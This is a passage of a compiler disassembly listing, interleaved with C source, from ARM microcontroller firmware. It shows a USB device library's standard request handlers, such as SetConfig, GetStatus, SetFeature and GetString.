 800be58:	2b02      	cmp	r3, #2
 800be5a:	d002      	beq.n	800be62 <USBD_SetConfig+0x3e>
 800be5c:	2b03      	cmp	r3, #3
 800be5e:	d029      	beq.n	800beb4 <USBD_SetConfig+0x90>
 800be60:	e075      	b.n	800bf4e <USBD_SetConfig+0x12a>
  {
    case USBD_STATE_ADDRESSED:
      if (cfgidx != 0U)
 800be62:	4b44      	ldr	r3, [pc, #272]	; (800bf74 <USBD_SetConfig+0x150>)
 800be64:	781b      	ldrb	r3, [r3, #0]
 800be66:	2b00      	cmp	r3, #0
 800be68:	d020      	beq.n	800beac <USBD_SetConfig+0x88>
      {
        pdev->dev_config = cfgidx;
 800be6a:	4b42      	ldr	r3, [pc, #264]	; (800bf74 <USBD_SetConfig+0x150>)
 800be6c:	781b      	ldrb	r3, [r3, #0]
 800be6e:	461a      	mov	r2, r3
 800be70:	687b      	ldr	r3, [r7, #4]
 800be72:	605a      	str	r2, [r3, #4]

        ret = USBD_SetClassConfig(pdev, cfgidx);
 800be74:	4b3f      	ldr	r3, [pc, #252]	; (800bf74 <USBD_SetConfig+0x150>)
 800be76:	781b      	ldrb	r3, [r3, #0]
 800be78:	4619      	mov	r1, r3
 800be7a:	6878      	ldr	r0, [r7, #4]
 800be7c:	f7ff f848 	bl	800af10 <USBD_SetClassConfig>
 800be80:	4603      	mov	r3, r0
 800be82:	73fb      	strb	r3, [r7, #15]

        if (ret != USBD_OK)
 800be84:	7bfb      	ldrb	r3, [r7, #15]
 800be86:	2b00      	cmp	r3, #0
 800be88:	d008      	beq.n	800be9c <USBD_SetConfig+0x78>
        {
          USBD_CtlError(pdev, req);
 800be8a:	6839      	ldr	r1, [r7, #0]
 800be8c:	6878      	ldr	r0, [r7, #4]
 800be8e:	f000 f962 	bl	800c156 <USBD_CtlError>
          pdev->dev_state = USBD_STATE_ADDRESSED;
 800be92:	687b      	ldr	r3, [r7, #4]
 800be94:	2202      	movs	r2, #2
 800be96:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      }
      else
      {
        (void)USBD_CtlSendStatus(pdev);
      }
      break;
 800be9a:	e065      	b.n	800bf68 <USBD_SetConfig+0x144>
          (void)USBD_CtlSendStatus(pdev);
 800be9c:	6878      	ldr	r0, [r7, #4]
 800be9e:	f000 fa25 	bl	800c2ec <USBD_CtlSendStatus>
          pdev->dev_state = USBD_STATE_CONFIGURED;
 800bea2:	687b      	ldr	r3, [r7, #4]
 800bea4:	2203      	movs	r2, #3
 800bea6:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      break;
 800beaa:	e05d      	b.n	800bf68 <USBD_SetConfig+0x144>
        (void)USBD_CtlSendStatus(pdev);
 800beac:	6878      	ldr	r0, [r7, #4]
 800beae:	f000 fa1d 	bl	800c2ec <USBD_CtlSendStatus>
      break;
 800beb2:	e059      	b.n	800bf68 <USBD_SetConfig+0x144>

    case USBD_STATE_CONFIGURED:
      if (cfgidx == 0U)
 800beb4:	4b2f      	ldr	r3, [pc, #188]	; (800bf74 <USBD_SetConfig+0x150>)
 800beb6:	781b      	ldrb	r3, [r3, #0]
 800beb8:	2b00      	cmp	r3, #0
 800beba:	d112      	bne.n	800bee2 <USBD_SetConfig+0xbe>
      {
        pdev->dev_state = USBD_STATE_ADDRESSED;
 800bebc:	687b      	ldr	r3, [r7, #4]
 800bebe:	2202      	movs	r2, #2
 800bec0:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
        pdev->dev_config = cfgidx;
 800bec4:	4b2b      	ldr	r3, [pc, #172]	; (800bf74 <USBD_SetConfig+0x150>)
 800bec6:	781b      	ldrb	r3, [r3, #0]
 800bec8:	461a      	mov	r2, r3
 800beca:	687b      	ldr	r3, [r7, #4]
 800becc:	605a      	str	r2, [r3, #4]
        (void)USBD_ClrClassConfig(pdev, cfgidx);
 800bece:	4b29      	ldr	r3, [pc, #164]	; (800bf74 <USBD_SetConfig+0x150>)
 800bed0:	781b      	ldrb	r3, [r3, #0]
 800bed2:	4619      	mov	r1, r3
 800bed4:	6878      	ldr	r0, [r7, #4]
 800bed6:	f7ff f837 	bl	800af48 <USBD_ClrClassConfig>
        (void)USBD_CtlSendStatus(pdev);
 800beda:	6878      	ldr	r0, [r7, #4]
 800bedc:	f000 fa06 	bl	800c2ec <USBD_CtlSendStatus>
      }
      else
      {
        (void)USBD_CtlSendStatus(pdev);
      }
      break;
 800bee0:	e042      	b.n	800bf68 <USBD_SetConfig+0x144>
      else if (cfgidx != pdev->dev_config)
 800bee2:	4b24      	ldr	r3, [pc, #144]	; (800bf74 <USBD_SetConfig+0x150>)
 800bee4:	781b      	ldrb	r3, [r3, #0]
 800bee6:	461a      	mov	r2, r3
 800bee8:	687b      	ldr	r3, [r7, #4]
 800beea:	685b      	ldr	r3, [r3, #4]
 800beec:	429a      	cmp	r2, r3
 800beee:	d02a      	beq.n	800bf46 <USBD_SetConfig+0x122>
        (void)USBD_ClrClassConfig(pdev, (uint8_t)pdev->dev_config);
 800bef0:	687b      	ldr	r3, [r7, #4]
 800bef2:	685b      	ldr	r3, [r3, #4]
 800bef4:	b2db      	uxtb	r3, r3
 800bef6:	4619      	mov	r1, r3
 800bef8:	6878      	ldr	r0, [r7, #4]
 800befa:	f7ff f825 	bl	800af48 <USBD_ClrClassConfig>
        pdev->dev_config = cfgidx;
 800befe:	4b1d      	ldr	r3, [pc, #116]	; (800bf74 <USBD_SetConfig+0x150>)
 800bf00:	781b      	ldrb	r3, [r3, #0]
 800bf02:	461a      	mov	r2, r3
 800bf04:	687b      	ldr	r3, [r7, #4]
 800bf06:	605a      	str	r2, [r3, #4]
        ret = USBD_SetClassConfig(pdev, cfgidx);
 800bf08:	4b1a      	ldr	r3, [pc, #104]	; (800bf74 <USBD_SetConfig+0x150>)
 800bf0a:	781b      	ldrb	r3, [r3, #0]
 800bf0c:	4619      	mov	r1, r3
 800bf0e:	6878      	ldr	r0, [r7, #4]
 800bf10:	f7fe fffe 	bl	800af10 <USBD_SetClassConfig>
 800bf14:	4603      	mov	r3, r0
 800bf16:	73fb      	strb	r3, [r7, #15]
        if (ret != USBD_OK)
 800bf18:	7bfb      	ldrb	r3, [r7, #15]
 800bf1a:	2b00      	cmp	r3, #0
 800bf1c:	d00f      	beq.n	800bf3e <USBD_SetConfig+0x11a>
          USBD_CtlError(pdev, req);
 800bf1e:	6839      	ldr	r1, [r7, #0]
 800bf20:	6878      	ldr	r0, [r7, #4]
 800bf22:	f000 f918 	bl	800c156 <USBD_CtlError>
          (void)USBD_ClrClassConfig(pdev, (uint8_t)pdev->dev_config);
 800bf26:	687b      	ldr	r3, [r7, #4]
 800bf28:	685b      	ldr	r3, [r3, #4]
 800bf2a:	b2db      	uxtb	r3, r3
 800bf2c:	4619      	mov	r1, r3
 800bf2e:	6878      	ldr	r0, [r7, #4]
 800bf30:	f7ff f80a 	bl	800af48 <USBD_ClrClassConfig>
          pdev->dev_state = USBD_STATE_ADDRESSED;
 800bf34:	687b      	ldr	r3, [r7, #4]
 800bf36:	2202      	movs	r2, #2
 800bf38:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      break;
 800bf3c:	e014      	b.n	800bf68 <USBD_SetConfig+0x144>
          (void)USBD_CtlSendStatus(pdev);
 800bf3e:	6878      	ldr	r0, [r7, #4]
 800bf40:	f000 f9d4 	bl	800c2ec <USBD_CtlSendStatus>
      break;
 800bf44:	e010      	b.n	800bf68 <USBD_SetConfig+0x144>
        (void)USBD_CtlSendStatus(pdev);
 800bf46:	6878      	ldr	r0, [r7, #4]
 800bf48:	f000 f9d0 	bl	800c2ec <USBD_CtlSendStatus>
      break;
 800bf4c:	e00c      	b.n	800bf68 <USBD_SetConfig+0x144>

    default:
      USBD_CtlError(pdev, req);
 800bf4e:	6839      	ldr	r1, [r7, #0]
 800bf50:	6878      	ldr	r0, [r7, #4]
 800bf52:	f000 f900 	bl	800c156 <USBD_CtlError>
      (void)USBD_ClrClassConfig(pdev, cfgidx);
 800bf56:	4b07      	ldr	r3, [pc, #28]	; (800bf74 <USBD_SetConfig+0x150>)
 800bf58:	781b      	ldrb	r3, [r3, #0]
 800bf5a:	4619      	mov	r1, r3
 800bf5c:	6878      	ldr	r0, [r7, #4]
 800bf5e:	f7fe fff3 	bl	800af48 <USBD_ClrClassConfig>
      ret = USBD_FAIL;
 800bf62:	2303      	movs	r3, #3
 800bf64:	73fb      	strb	r3, [r7, #15]
      break;
 800bf66:	bf00      	nop
  }

  return ret;
 800bf68:	7bfb      	ldrb	r3, [r7, #15]
}
 800bf6a:	4618      	mov	r0, r3
 800bf6c:	3710      	adds	r7, #16
 800bf6e:	46bd      	mov	sp, r7
 800bf70:	bd80      	pop	{r7, pc}
 800bf72:	bf00      	nop
 800bf74:	200003bc 	.word	0x200003bc

0800bf78 <USBD_GetConfig>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetConfig(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800bf78:	b580      	push	{r7, lr}
 800bf7a:	b082      	sub	sp, #8
 800bf7c:	af00      	add	r7, sp, #0
 800bf7e:	6078      	str	r0, [r7, #4]
 800bf80:	6039      	str	r1, [r7, #0]
  if (req->wLength != 1U)
 800bf82:	683b      	ldr	r3, [r7, #0]
 800bf84:	88db      	ldrh	r3, [r3, #6]
 800bf86:	2b01      	cmp	r3, #1
 800bf88:	d004      	beq.n	800bf94 <USBD_GetConfig+0x1c>
  {
    USBD_CtlError(pdev, req);
 800bf8a:	6839      	ldr	r1, [r7, #0]
 800bf8c:	6878      	ldr	r0, [r7, #4]
 800bf8e:	f000 f8e2 	bl	800c156 <USBD_CtlError>
      default:
        USBD_CtlError(pdev, req);
        break;
    }
  }
}
 800bf92:	e023      	b.n	800bfdc <USBD_GetConfig+0x64>
    switch (pdev->dev_state)
 800bf94:	687b      	ldr	r3, [r7, #4]
 800bf96:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800bf9a:	b2db      	uxtb	r3, r3
 800bf9c:	2b02      	cmp	r3, #2
 800bf9e:	dc02      	bgt.n	800bfa6 <USBD_GetConfig+0x2e>
 800bfa0:	2b00      	cmp	r3, #0
 800bfa2:	dc03      	bgt.n	800bfac <USBD_GetConfig+0x34>
 800bfa4:	e015      	b.n	800bfd2 <USBD_GetConfig+0x5a>
 800bfa6:	2b03      	cmp	r3, #3
 800bfa8:	d00b      	beq.n	800bfc2 <USBD_GetConfig+0x4a>
 800bfaa:	e012      	b.n	800bfd2 <USBD_GetConfig+0x5a>
        pdev->dev_default_config = 0U;
 800bfac:	687b      	ldr	r3, [r7, #4]
 800bfae:	2200      	movs	r2, #0
 800bfb0:	609a      	str	r2, [r3, #8]
        (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_default_config, 1U);
 800bfb2:	687b      	ldr	r3, [r7, #4]
 800bfb4:	3308      	adds	r3, #8
 800bfb6:	2201      	movs	r2, #1
 800bfb8:	4619      	mov	r1, r3
 800bfba:	6878      	ldr	r0, [r7, #4]
 800bfbc:	f000 f93c 	bl	800c238 <USBD_CtlSendData>
        break;
 800bfc0:	e00c      	b.n	800bfdc <USBD_GetConfig+0x64>
        (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_config, 1U);
 800bfc2:	687b      	ldr	r3, [r7, #4]
 800bfc4:	3304      	adds	r3, #4
 800bfc6:	2201      	movs	r2, #1
 800bfc8:	4619      	mov	r1, r3
 800bfca:	6878      	ldr	r0, [r7, #4]
 800bfcc:	f000 f934 	bl	800c238 <USBD_CtlSendData>
        break;
 800bfd0:	e004      	b.n	800bfdc <USBD_GetConfig+0x64>
        USBD_CtlError(pdev, req);
 800bfd2:	6839      	ldr	r1, [r7, #0]
 800bfd4:	6878      	ldr	r0, [r7, #4]
 800bfd6:	f000 f8be 	bl	800c156 <USBD_CtlError>
        break;
 800bfda:	bf00      	nop
}
 800bfdc:	bf00      	nop
 800bfde:	3708      	adds	r7, #8
 800bfe0:	46bd      	mov	sp, r7
 800bfe2:	bd80      	pop	{r7, pc}

0800bfe4 <USBD_GetStatus>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetStatus(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800bfe4:	b580      	push	{r7, lr}
 800bfe6:	b082      	sub	sp, #8
 800bfe8:	af00      	add	r7, sp, #0
 800bfea:	6078      	str	r0, [r7, #4]
 800bfec:	6039      	str	r1, [r7, #0]
  switch (pdev->dev_state)
 800bfee:	687b      	ldr	r3, [r7, #4]
 800bff0:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800bff4:	b2db      	uxtb	r3, r3
 800bff6:	3b01      	subs	r3, #1
 800bff8:	2b02      	cmp	r3, #2
 800bffa:	d81e      	bhi.n	800c03a <USBD_GetStatus+0x56>
  {
    case USBD_STATE_DEFAULT:
    case USBD_STATE_ADDRESSED:
    case USBD_STATE_CONFIGURED:
      if (req->wLength != 0x2U)
 800bffc:	683b      	ldr	r3, [r7, #0]
 800bffe:	88db      	ldrh	r3, [r3, #6]
 800c000:	2b02      	cmp	r3, #2
 800c002:	d004      	beq.n	800c00e <USBD_GetStatus+0x2a>
      {
        USBD_CtlError(pdev, req);
 800c004:	6839      	ldr	r1, [r7, #0]
 800c006:	6878      	ldr	r0, [r7, #4]
 800c008:	f000 f8a5 	bl	800c156 <USBD_CtlError>
        break;
 800c00c:	e01a      	b.n	800c044 <USBD_GetStatus+0x60>
      }

#if (USBD_SELF_POWERED == 1U)
      pdev->dev_config_status = USB_CONFIG_SELF_POWERED;
 800c00e:	687b      	ldr	r3, [r7, #4]
 800c010:	2201      	movs	r2, #1
 800c012:	60da      	str	r2, [r3, #12]
#else
      pdev->dev_config_status = 0U;
#endif /* USBD_SELF_POWERED */

      if (pdev->dev_remote_wakeup != 0U)
 800c014:	687b      	ldr	r3, [r7, #4]
 800c016:	f8d3 32a4 	ldr.w	r3, [r3, #676]	; 0x2a4
 800c01a:	2b00      	cmp	r3, #0
 800c01c:	d005      	beq.n	800c02a <USBD_GetStatus+0x46>
      {
        pdev->dev_config_status |= USB_CONFIG_REMOTE_WAKEUP;
 800c01e:	687b      	ldr	r3, [r7, #4]
 800c020:	68db      	ldr	r3, [r3, #12]
 800c022:	f043 0202 	orr.w	r2, r3, #2
 800c026:	687b      	ldr	r3, [r7, #4]
 800c028:	60da      	str	r2, [r3, #12]
      }

      (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_config_status, 2U);
 800c02a:	687b      	ldr	r3, [r7, #4]
 800c02c:	330c      	adds	r3, #12
 800c02e:	2202      	movs	r2, #2
 800c030:	4619      	mov	r1, r3
 800c032:	6878      	ldr	r0, [r7, #4]
 800c034:	f000 f900 	bl	800c238 <USBD_CtlSendData>
      break;
 800c038:	e004      	b.n	800c044 <USBD_GetStatus+0x60>

    default:
      USBD_CtlError(pdev, req);
 800c03a:	6839      	ldr	r1, [r7, #0]
 800c03c:	6878      	ldr	r0, [r7, #4]
 800c03e:	f000 f88a 	bl	800c156 <USBD_CtlError>
      break;
 800c042:	bf00      	nop
  }
}
 800c044:	bf00      	nop
 800c046:	3708      	adds	r7, #8
 800c048:	46bd      	mov	sp, r7
 800c04a:	bd80      	pop	{r7, pc}

0800c04c <USBD_SetFeature>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_SetFeature(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c04c:	b580      	push	{r7, lr}
 800c04e:	b082      	sub	sp, #8
 800c050:	af00      	add	r7, sp, #0
 800c052:	6078      	str	r0, [r7, #4]
 800c054:	6039      	str	r1, [r7, #0]
  if (req->wValue == USB_FEATURE_REMOTE_WAKEUP)
 800c056:	683b      	ldr	r3, [r7, #0]
 800c058:	885b      	ldrh	r3, [r3, #2]
 800c05a:	2b01      	cmp	r3, #1
 800c05c:	d107      	bne.n	800c06e <USBD_SetFeature+0x22>
  {
    pdev->dev_remote_wakeup = 1U;
 800c05e:	687b      	ldr	r3, [r7, #4]
 800c060:	2201      	movs	r2, #1
 800c062:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
    (void)USBD_CtlSendStatus(pdev);
 800c066:	6878      	ldr	r0, [r7, #4]
 800c068:	f000 f940 	bl	800c2ec <USBD_CtlSendStatus>
  }
  else
  {
    USBD_CtlError(pdev, req);
  }
}
 800c06c:	e013      	b.n	800c096 <USBD_SetFeature+0x4a>
  else if (req->wValue == USB_FEATURE_TEST_MODE)
 800c06e:	683b      	ldr	r3, [r7, #0]
 800c070:	885b      	ldrh	r3, [r3, #2]
 800c072:	2b02      	cmp	r3, #2
 800c074:	d10b      	bne.n	800c08e <USBD_SetFeature+0x42>
    pdev->dev_test_mode = (uint8_t)(req->wIndex >> 8);
 800c076:	683b      	ldr	r3, [r7, #0]
 800c078:	889b      	ldrh	r3, [r3, #4]
 800c07a:	0a1b      	lsrs	r3, r3, #8
 800c07c:	b29b      	uxth	r3, r3
 800c07e:	b2da      	uxtb	r2, r3
 800c080:	687b      	ldr	r3, [r7, #4]
 800c082:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
    (void)USBD_CtlSendStatus(pdev);
 800c086:	6878      	ldr	r0, [r7, #4]
 800c088:	f000 f930 	bl	800c2ec <USBD_CtlSendStatus>
}
 800c08c:	e003      	b.n	800c096 <USBD_SetFeature+0x4a>
    USBD_CtlError(pdev, req);
 800c08e:	6839      	ldr	r1, [r7, #0]
 800c090:	6878      	ldr	r0, [r7, #4]
 800c092:	f000 f860 	bl	800c156 <USBD_CtlError>
}
 800c096:	bf00      	nop
 800c098:	3708      	adds	r7, #8
 800c09a:	46bd      	mov	sp, r7
 800c09c:	bd80      	pop	{r7, pc}

0800c09e <USBD_ClrFeature>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_ClrFeature(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c09e:	b580      	push	{r7, lr}
 800c0a0:	b082      	sub	sp, #8
 800c0a2:	af00      	add	r7, sp, #0
 800c0a4:	6078      	str	r0, [r7, #4]
 800c0a6:	6039      	str	r1, [r7, #0]
  switch (pdev->dev_state)
 800c0a8:	687b      	ldr	r3, [r7, #4]
 800c0aa:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c0ae:	b2db      	uxtb	r3, r3
 800c0b0:	3b01      	subs	r3, #1
 800c0b2:	2b02      	cmp	r3, #2
 800c0b4:	d80b      	bhi.n	800c0ce <USBD_ClrFeature+0x30>
  {
    case USBD_STATE_DEFAULT:
    case USBD_STATE_ADDRESSED:
    case USBD_STATE_CONFIGURED:
      if (req->wValue == USB_FEATURE_REMOTE_WAKEUP)
 800c0b6:	683b      	ldr	r3, [r7, #0]
 800c0b8:	885b      	ldrh	r3, [r3, #2]
 800c0ba:	2b01      	cmp	r3, #1
 800c0bc:	d10c      	bne.n	800c0d8 <USBD_ClrFeature+0x3a>
      {
        pdev->dev_remote_wakeup = 0U;
 800c0be:	687b      	ldr	r3, [r7, #4]
 800c0c0:	2200      	movs	r2, #0
 800c0c2:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
        (void)USBD_CtlSendStatus(pdev);
 800c0c6:	6878      	ldr	r0, [r7, #4]
 800c0c8:	f000 f910 	bl	800c2ec <USBD_CtlSendStatus>
      }
      break;
 800c0cc:	e004      	b.n	800c0d8 <USBD_ClrFeature+0x3a>

    default:
      USBD_CtlError(pdev, req);
 800c0ce:	6839      	ldr	r1, [r7, #0]
 800c0d0:	6878      	ldr	r0, [r7, #4]
 800c0d2:	f000 f840 	bl	800c156 <USBD_CtlError>
      break;
 800c0d6:	e000      	b.n	800c0da <USBD_ClrFeature+0x3c>
      break;
 800c0d8:	bf00      	nop
  }
}
 800c0da:	bf00      	nop
 800c0dc:	3708      	adds	r7, #8
 800c0de:	46bd      	mov	sp, r7
 800c0e0:	bd80      	pop	{r7, pc}

0800c0e2 <USBD_ParseSetupRequest>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval None
  */
void USBD_ParseSetupRequest(USBD_SetupReqTypedef *req, uint8_t *pdata)
{
 800c0e2:	b580      	push	{r7, lr}
 800c0e4:	b084      	sub	sp, #16
 800c0e6:	af00      	add	r7, sp, #0
 800c0e8:	6078      	str	r0, [r7, #4]
 800c0ea:	6039      	str	r1, [r7, #0]
  uint8_t *pbuff = pdata;
 800c0ec:	683b      	ldr	r3, [r7, #0]
 800c0ee:	60fb      	str	r3, [r7, #12]

  req->bmRequest = *(uint8_t *)(pbuff);
 800c0f0:	68fb      	ldr	r3, [r7, #12]
 800c0f2:	781a      	ldrb	r2, [r3, #0]
 800c0f4:	687b      	ldr	r3, [r7, #4]
 800c0f6:	701a      	strb	r2, [r3, #0]

  pbuff++;
 800c0f8:	68fb      	ldr	r3, [r7, #12]
 800c0fa:	3301      	adds	r3, #1
 800c0fc:	60fb      	str	r3, [r7, #12]
  req->bRequest = *(uint8_t *)(pbuff);
 800c0fe:	68fb      	ldr	r3, [r7, #12]
 800c100:	781a      	ldrb	r2, [r3, #0]
 800c102:	687b      	ldr	r3, [r7, #4]
 800c104:	705a      	strb	r2, [r3, #1]

  pbuff++;
 800c106:	68fb      	ldr	r3, [r7, #12]
 800c108:	3301      	adds	r3, #1
 800c10a:	60fb      	str	r3, [r7, #12]
  req->wValue = SWAPBYTE(pbuff);
 800c10c:	68f8      	ldr	r0, [r7, #12]
 800c10e:	f7ff fa16 	bl	800b53e <SWAPBYTE>
 800c112:	4603      	mov	r3, r0
 800c114:	461a      	mov	r2, r3
 800c116:	687b      	ldr	r3, [r7, #4]
 800c118:	805a      	strh	r2, [r3, #2]

  pbuff++;
 800c11a:	68fb      	ldr	r3, [r7, #12]
 800c11c:	3301      	adds	r3, #1
 800c11e:	60fb      	str	r3, [r7, #12]
  pbuff++;
 800c120:	68fb      	ldr	r3, [r7, #12]
 800c122:	3301      	adds	r3, #1
 800c124:	60fb      	str	r3, [r7, #12]
  req->wIndex = SWAPBYTE(pbuff);
 800c126:	68f8      	ldr	r0, [r7, #12]
 800c128:	f7ff fa09 	bl	800b53e <SWAPBYTE>
 800c12c:	4603      	mov	r3, r0
 800c12e:	461a      	mov	r2, r3
 800c130:	687b      	ldr	r3, [r7, #4]
 800c132:	809a      	strh	r2, [r3, #4]

  pbuff++;
 800c134:	68fb      	ldr	r3, [r7, #12]
 800c136:	3301      	adds	r3, #1
 800c138:	60fb      	str	r3, [r7, #12]
  pbuff++;
 800c13a:	68fb      	ldr	r3, [r7, #12]
 800c13c:	3301      	adds	r3, #1
 800c13e:	60fb      	str	r3, [r7, #12]
  req->wLength = SWAPBYTE(pbuff);
 800c140:	68f8      	ldr	r0, [r7, #12]
 800c142:	f7ff f9fc 	bl	800b53e <SWAPBYTE>
 800c146:	4603      	mov	r3, r0
 800c148:	461a      	mov	r2, r3
 800c14a:	687b      	ldr	r3, [r7, #4]
 800c14c:	80da      	strh	r2, [r3, #6]
}
 800c14e:	bf00      	nop
 800c150:	3710      	adds	r7, #16
 800c152:	46bd      	mov	sp, r7
 800c154:	bd80      	pop	{r7, pc}

0800c156 <USBD_CtlError>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval None
  */
void USBD_CtlError(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c156:	b580      	push	{r7, lr}
 800c158:	b082      	sub	sp, #8
 800c15a:	af00      	add	r7, sp, #0
 800c15c:	6078      	str	r0, [r7, #4]
 800c15e:	6039      	str	r1, [r7, #0]
  UNUSED(req);

  (void)USBD_LL_StallEP(pdev, 0x80U);
 800c160:	2180      	movs	r1, #128	; 0x80
 800c162:	6878      	ldr	r0, [r7, #4]
 800c164:	f000 fd6a 	bl	800cc3c <USBD_LL_StallEP>
  (void)USBD_LL_StallEP(pdev, 0U);
 800c168:	2100      	movs	r1, #0
 800c16a:	6878      	ldr	r0, [r7, #4]
 800c16c:	f000 fd66 	bl	800cc3c <USBD_LL_StallEP>
}
 800c170:	bf00      	nop
 800c172:	3708      	adds	r7, #8
 800c174:	46bd      	mov	sp, r7
 800c176:	bd80      	pop	{r7, pc}

0800c178 <USBD_GetString>:
  * @param  unicode : Formatted string buffer (unicode)
  * @param  len : descriptor length
  * @retval None
  */
void USBD_GetString(uint8_t *desc, uint8_t *unicode, uint16_t *len)
{
 800c178:	b580      	push	{r7, lr}
 800c17a:	b086      	sub	sp, #24
 800c17c:	af00      	add	r7, sp, #0
 800c17e:	60f8      	str	r0, [r7, #12]
 800c180:	60b9      	str	r1, [r7, #8]
 800c182:	607a      	str	r2, [r7, #4]
  uint8_t idx = 0U;
 800c184:	2300      	movs	r3, #0
 800c186:	75fb      	strb	r3, [r7, #23]
  uint8_t *pdesc;

  if (desc == NULL)
 800c188:	68fb      	ldr	r3, [r7, #12]
 800c18a:	2b00      	cmp	r3, #0
 800c18c:	d036      	beq.n	800c1fc <USBD_GetString+0x84>
  {
    return;
  }

  pdesc = desc;
 800c18e:	68fb      	ldr	r3, [r7, #12]
 800c190:	613b      	str	r3, [r7, #16]
  *len = ((uint16_t)USBD_GetLen(pdesc) * 2U) + 2U;
 800c192:	6938      	ldr	r0, [r7, #16]
 800c194:	f000 f836 	bl	800c204 <USBD_GetLen>
 800c198:	4603      	mov	r3, r0
 800c19a:	3301      	adds	r3, #1
 800c19c:	b29b      	uxth	r3, r3
 800c19e:	005b      	lsls	r3, r3, #1
 800c1a0:	b29a      	uxth	r2, r3
 800c1a2:	687b      	ldr	r3, [r7, #4]
 800c1a4:	801a      	strh	r2, [r3, #0]

  unicode[idx] = *(uint8_t *)len;
 800c1a6:	7dfb      	ldrb	r3, [r7, #23]
 800c1a8:	68ba      	ldr	r2, [r7, #8]
 800c1aa:	4413      	add	r3, r2
 800c1ac:	687a      	ldr	r2, [r7, #4]
 800c1ae:	7812      	ldrb	r2, [r2, #0]
 800c1b0:	701a      	strb	r2, [r3, #0]
  idx++;
 800c1b2:	7dfb      	ldrb	r3, [r7, #23]
 800c1b4:	3301      	adds	r3, #1
 800c1b6:	75fb      	strb	r3, [r7, #23]
  unicode[idx] = USB_DESC_TYPE_STRING;
 800c1b8:	7dfb      	ldrb	r3, [r7, #23]
 800c1ba:	68ba      	ldr	r2, [r7, #8]
 800c1bc:	4413      	add	r3, r2
 800c1be:	2203      	movs	r2, #3
 800c1c0:	701a      	strb	r2, [r3, #0]
  idx++;
 800c1c2:	7dfb      	ldrb	r3, [r7, #23]
 800c1c4:	3301      	adds	r3, #1
 800c1c6:	75fb      	strb	r3, [r7, #23]

  while (*pdesc != (uint8_t)'\0')
 800c1c8:	e013      	b.n	800c1f2 <USBD_GetString+0x7a>
  {
    unicode[idx] = *pdesc;
 800c1ca:	7dfb      	ldrb	r3, [r7, #23]
 800c1cc:	68ba      	ldr	r2, [r7, #8]
 800c1ce:	4413      	add	r3, r2
 800c1d0:	693a      	ldr	r2, [r7, #16]
 800c1d2:	7812      	ldrb	r2, [r2, #0]
 800c1d4:	701a      	strb	r2, [r3, #0]
    pdesc++;
 800c1d6:	693b      	ldr	r3, [r7, #16]
 800c1d8:	3301      	adds	r3, #1
 800c1da:	613b      	str	r3, [r7, #16]
    idx++;
 800c1dc:	7dfb      	ldrb	r3, [r7, #23]
 800c1de:	3301      	adds	r3, #1
 800c1e0:	75fb      	strb	r3, [r7, #23]

    unicode[idx] = 0U;
 800c1e2:	7dfb      	ldrb	r3, [r7, #23]
 800c1e4:	68ba      	ldr	r2, [r7, #8]
 800c1e6:	4413      	add	r3, r2
 800c1e8:	2200      	movs	r2, #0
 800c1ea:	701a      	strb	r2, [r3, #0]
    idx++;
 800c1ec:	7dfb      	ldrb	r3, [r7, #23]
 800c1ee:	3301      	adds	r3, #1
 800c1f0:	75fb      	strb	r3, [r7, #23]
  while (*pdesc != (uint8_t)'\0')
 800c1f2:	693b      	ldr	r3, [r7, #16]
 800c1f4:	781b      	ldrb	r3, [r3, #0]
 800c1f6:	2b00      	cmp	r3, #0
 800c1f8:	d1e7      	bne.n	800c1ca <USBD_GetString+0x52>
 800c1fa:	e000      	b.n	800c1fe <USBD_GetString+0x86>
    return;
 800c1fc:	bf00      	nop
  }
}
 800c1fe:	3718      	adds	r7, #24
 800c200:	46bd      	mov	sp, r7
 800c202:	bd80      	pop	{r7, pc}

0800c204 <USBD_GetLen>:
  *         return the string length
   * @param  buf : pointer to the ascii string buffer
  * @retval string length
  */
static uint8_t USBD_GetLen(uint8_t *buf)
{
 800c204:	b480      	push	{r7}
 800c206:	b085      	sub	sp, #20
 800c208:	af00      	add	r7, sp, #0
 800c20a:	6078      	str	r0, [r7, #4]
  uint8_t  len = 0U;
 800c20c:	2300      	movs	r3, #0
 800c20e:	73fb      	strb	r3, [r7, #15]
  uint8_t *pbuff = buf;
 800c210:	687b      	ldr	r3, [r7, #4]
 800c212:	60bb      	str	r3, [r7, #8]

  while (*pbuff != (uint8_t)'\0')
 800c214:	e005      	b.n	800c222 <USBD_GetLen+0x1e>
  {
    len++;
 800c216:	7bfb      	ldrb	r3, [r7, #15]
 800c218:	3301      	adds	r3, #1
 800c21a:	73fb      	strb	r3, [r7, #15]
    pbuff++;
 800c21c:	68bb      	ldr	r3, [r7, #8]
 800c21e:	3301      	adds	r3, #1
 800c220:	60bb      	str	r3, [r7, #8]
  while (*pbuff != (uint8_t)'\0')
 800c222:	68bb      	ldr	r3, [r7, #8]
 800c224:	781b      	ldrb	r3, [r3, #0]
 800c226:	2b00      	cmp	r3, #0
 800c228:	d1f5      	bne.n	800c216 <USBD_GetLen+0x12>
  }

  return len;
